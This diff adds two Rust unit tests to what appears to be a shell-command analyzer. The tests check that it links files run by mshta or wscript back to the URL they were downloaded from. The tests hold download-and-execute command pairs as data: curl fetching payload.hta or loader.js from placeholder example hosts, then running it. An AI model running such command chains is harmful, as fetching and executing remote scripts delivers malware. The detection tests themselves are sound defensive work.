@@ -12265,6 +12265,29 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn mshta_slash_equivalent_hta_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\payload.hta https://mshta-slash-equivalent.example/payload.hta"#,
+            &mut env,
+        );
+        interpret_line("mshta C:/Temp/payload.hta", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta C:/Temp/payload.hta"
+                        && url == "https://mshta-slash-equivalent.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta slash-equivalent HTA did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn mshta_current_dir_hta_resolves_tracked_download_source() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
@@ -15035,6 +15058,28 @@ wscript loader.js
                 )
             }),
             "cscript basename did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wscript_slash_equivalent_resolves_full_path_download_source_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\loader.js https://script-host-slash-equivalent.example/loader.js"#,
+            &mut env,
+        );
+        interpret_line("wscript C:/Temp/loader.js", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "wscript C:/Temp/loader.js"
+                            && url == "https://script-host-slash-equivalent.example/loader.js"
+                )
+            }),
+            "wscript slash-equivalent full-path source did not resolve download source: {:?}",
             env.traits
         );
     }
